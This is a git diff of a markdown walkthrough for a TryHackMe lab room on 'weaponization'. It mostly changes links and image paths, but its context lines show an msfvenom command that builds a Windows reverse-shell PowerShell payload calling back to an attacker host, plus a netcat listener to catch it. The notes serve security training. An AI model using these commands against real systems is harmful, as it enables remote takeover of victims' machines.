@@ -1,6 +1,6 @@
 # Weaponization
 
-**Walkthrough:** [https://tryhackme.com/room/weaponization](https://tryhackme.com/room/weaponization)
+**Room Link:** [https://tryhackme.com/room/weaponization](https://tryhackme.com/room/weaponization)
 
 
 
@@ -47,11 +47,13 @@ rlwrap nc -lvnp 443
 rlwrap nc -lvnp 443
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ### DOC
+
+Do when have access to a Windows machine with word.
 
 ### PS1
 
@@ -67,6 +69,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f psh -o exploi
 rlwrap nc -lvnp 443
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
